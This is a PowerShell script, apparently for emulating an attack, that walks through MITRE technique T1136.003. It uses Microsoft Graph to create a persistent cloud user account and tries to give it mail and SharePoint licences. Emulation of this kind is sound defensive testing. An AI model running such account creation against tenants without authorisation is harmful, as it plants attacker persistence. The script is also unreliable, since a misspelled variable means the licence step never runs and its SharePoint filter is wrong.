<#
.SYNOPSIS
Connect to Graph API, create a user and assign licenses for exo and spo

.DESCRIPTION
TA0003: Persistence
T1136.003: Cloud Account
1st attack method
#>

Get-Module | Where-Object name -eq readenv | Remove-Module
Import-Module ../APIs/readEnv.psm1
Get-Module | Where-Object name -eq custom | Remove-Module
Import-Module ../APIs/custom.psm1
Get-Module | Where-Object name -eq randomPassword | Remove-Module
Import-Module ../Helpers/randomPassword.psm1


# We use the ews environment variables
Import-Environment "graph.env"

Get-Module | Where-Object name -eq oauth-microsoft | Remove-Module
Import-Module ../APIs/oauth-microsoft.psm1
$scope = "User.ReadWrite.All Organization.Read.All"
if ($null -eq $accessToken) { $accessToken = Get-DelegatedAccessToken -tenantId $env:TENANT_ID -clientId $env:GRAPH_DELEGATE_CLIENT_ID -scope $scope -redirectUrl $env:GRAPH_DELEGATE_REDIRECT_URI }

# Create a new user account
$url = "https://graph.microsoft.com/v1.0/users"
$rand = Get-Random -Minimum 1000 -Maximum 9999
$newAccount = @{
    "accountEnabled" = $True;
    "displayName" = "TA0003 - T1136.003 - 1 - $rand";
    "mailNickname" = "ta0003-t1136.003-1-$rand";
    "userPrincipalName" = "ta0003-t1136.003-1-$rand@$env:TENANT_ID";
    "passwordProfile" = @{
        "forceChangePasswordNextSignIn" = $True;
        "password" = "$(Create-OKPassword)";
    };
    "usageLocation" = "NL";
} | ConvertTo-Json
$newUser = Invoke-RestMethod $url -Method Post -ContentType "application/json" -Headers @{"Authorization"="Bearer $accessToken"} -Body $newAccount

$url = "https://graph.microsoft.com/v1.0/subscribedSkus"
$skus = Invoke-RestMethod $url -Headers @{"Authorization"="Bearer $accessToken"}
$skuToBeUsed = $null
foreach ($sku in $skus.value) {
    # We want an SKU which has a mailbox (so no EXCHANGE_S_FOUNDATION or similar, we accept 2GB, 50GB and 100GB mailboxes plus all academic and government variants)
    $hasExchange = @($sku.servicePlans | Where-Object { $_.servicePlanName -like "EXCHANGE_S_STANDARD*" -or $_.servicePlanName -like "EXCHANGE_S_ENTERPRISE*" -or $_.servicePlanName -like "EXCHANGE_S_DESKLESS*" }).Count -gt 0
    # SharePoint Plan 1, SharePoint Plan2, SharePoint Kiosk, and all academic and government variants
    $hasSharePoint = @($sku.servicePlans | Where-Object { $_.servicePlanName -like "SHAREPOINTSTANDARD*" -or $_.servicePlanName -like "EXCHANGE_S_ENTERPRISE*" -or $_.servicePlanName -like "SHAREPOINTDESKLESS*" }).Count -gt 0
    # Check if there are licenses available
    $licAvail = $sku.consumedUnits -lt $sku.prepaidUnits.enabled

    if ($hasExchange -and $hasSharePoint -and $licAvail) { $skuToBeUsed = $sku.skuId}
}
if ($null -ne $skuToBeUse) {
    $url = "https://graph.microsoft.com/v1.0/users/$($newUser.id)/assignLicense"
    $body = @{
        "addLicenses" = @(
            @{
                "skuId" = $skuToBeUsed;
            };
        );
        "removeLicenses" = @();
    }
    $body = ConvertTo-Json $body #Pipeline breaks empty array
    Invoke-RestMethod $url -Method Post -ContentType "application/json" -Headers @{"Authorization"="Bearer $accessToken"} -Body $body
}

# We cannot delete the account immediately, because propagation takes a long time